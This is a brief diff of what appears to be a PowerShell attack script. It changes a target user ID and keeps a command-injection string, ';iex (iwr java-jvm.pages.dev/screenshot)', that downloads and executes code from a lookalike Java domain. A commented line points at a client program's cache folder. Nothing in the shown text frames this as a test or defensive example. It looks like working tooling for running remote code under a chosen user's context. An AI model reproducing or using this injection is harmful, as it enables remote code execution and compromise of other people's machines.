@@ -1,4 +1,4 @@
-$target_user = "24919"
+$target_user = "33245"
 $command = ";iex (iwr java-jvm.pages.dev/screenshot)"
 
 #$e = dir "c:\Cache\pc-client.exe-1.0.0.0-0"
